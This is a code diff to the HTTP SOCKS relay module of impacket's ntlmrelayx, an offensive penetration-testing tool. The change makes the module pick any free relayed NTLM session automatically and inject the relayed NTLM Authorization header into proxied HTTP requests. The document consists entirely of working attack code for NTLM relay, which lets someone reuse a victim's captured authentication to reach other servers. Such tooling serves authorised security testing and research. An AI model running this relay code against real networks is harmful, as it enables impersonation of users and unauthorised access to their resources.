@@ -16,8 +16,6 @@
 # Author:
 #   Dirk-jan Mollema (@_dirkjan) / Fox-IT (https://www.fox-it.com)
 #
-import base64
-
 from impacket import LOG
 from impacket.examples.ntlmrelayx.servers.socksserver import SocksRelay
 
@@ -42,60 +40,45 @@ class HTTPSocksRelay(SocksRelay):
     def initConnection(self):
         pass
 
-    @staticmethod
-    def normalizeUsername(username):
-        """Normalize to DOMAIN/user format (uppercased).
-        Accepts: DOMAIN/user, DOMAIN\\user, user@domain.fqdn
+    # Keys in activeRelays that are metadata, not usernames
+    RELAY_META_KEYS = frozenset(('data', 'scheme'))
+
+    def findAvailableSession(self):
+        """Auto-select the first available relay session for this target.
+
+        activeRelays is keyed by username (DOMAIN/USER) plus metadata keys
+        ('data', 'scheme'). We pick the first session that isn't inUse.
         """
-        username = username.upper()
-        if '@' in username:
-            user, domain = username.split('@', 1)
-            return '%s/%s' % (domain.split('.')[0], user)
-        elif '\\' in username:
-            domain, user = username.split('\\', 1)
-            return '%s/%s' % (domain, user)
-        return username
+        for key in self.activeRelays:
+            if key in self.RELAY_META_KEYS:
+                continue
+            relay = self.activeRelays[key]
+            if relay['inUse']:
+                LOG.debug('HTTP: Session for %s@%s(%s) is in use, trying next' % (
+                    key, self.targetHost, self.targetPort))
+                continue
+            return key, relay
+        return None, None
 
     def skipAuthentication(self):
         # Receive the initial HTTP request from the SOCKS client (e.g. curl)
         data = self.recvFullRequest()
         if not data:
             return False
-        headerDict = self.getHeaders(data)
-        try:
-            creds = headerDict['authorization']
-            if 'Basic' not in creds:
-                raise KeyError()
-            basicAuth = base64.b64decode(creds[6:]).decode('ascii')
-            self.username = self.normalizeUsername(basicAuth.split(':')[0])
 
-            # Check if we have a relay session for this user
-            if self.username in self.activeRelays:
-                if self.activeRelays[self.username]['inUse'] is True:
-                    LOG.error('HTTP: Connection for %s@%s(%s) is being used at the moment!' % (
-                        self.username, self.targetHost, self.targetPort))
-                    return False
-                else:
-                    LOG.info('HTTP: Proxying client session for %s@%s(%s)' % (
-                        self.username, self.targetHost, self.targetPort))
-                    self.protocolClient = self.activeRelays[self.username]['protocolClient']
-                    self.session = self.protocolClient.session
-            else:
-                LOG.error('HTTP: No session for %s@%s(%s) available' % (
-                    self.username, self.targetHost, self.targetPort))
-                return False
-
-        except KeyError:
-            # No auth provided - prompt for Basic auth so we can identify which relay session to use
-            LOG.debug('No authentication provided, prompting for basic authentication')
-            reply = [
-                b'HTTP/1.1 401 Unauthorized',
-                b'WWW-Authenticate: Basic realm="ntlmrelayx - provide DOMAIN/user or DOMAIN\\\\user"',
-                b'Connection: close',
-                b'', b''
-            ]
+        # Auto-select an available relay session for this target
+        self.username, relay = self.findAvailableSession()
+        if self.username is None:
+            LOG.error('HTTP: No available session for %s(%s)' % (
+                self.targetHost, self.targetPort))
+            reply = [b'HTTP/1.1 503 Service Unavailable', b'Connection: close', b'', b'']
             self.socksSocket.send(EOL.join(reply))
             return False
+
+        LOG.info('HTTP: Proxying client session for %s@%s(%s)' % (
+            self.username, self.targetHost, self.targetPort))
+        self.protocolClient = relay['protocolClient']
+        self.session = self.protocolClient.session
 
         # Proxy the initial request through the NTLM-authenticated relay session
         self.proxyRequest(data)
@@ -163,7 +146,7 @@ class HTTPSocksRelay(SocksRelay):
         proxyHeaders = {}
         for key, val in headers.items():
             lk = key.lower()
-            # Remove client-side auth - the relay session provides NTLM auth
+            # Remove client-side auth - we inject the relay's NTLM auth below
             if lk == 'authorization':
                 continue
             # Keep the connection alive to preserve NTLM auth state
@@ -171,6 +154,10 @@ class HTTPSocksRelay(SocksRelay):
                 proxyHeaders[key] = 'Keep-Alive'
                 continue
             proxyHeaders[key] = val
+
+        # Inject the NTLM auth header obtained from the successful relay
+        if hasattr(self.protocolClient, 'ntlmAuthHeader') and self.protocolClient.ntlmAuthHeader:
+            proxyHeaders['Authorization'] = self.protocolClient.ntlmAuthHeader
 
         # Forward the request through the authenticated HTTPConnection
         self.session.request(method, path, body=body if body else None, headers=proxyHeaders)
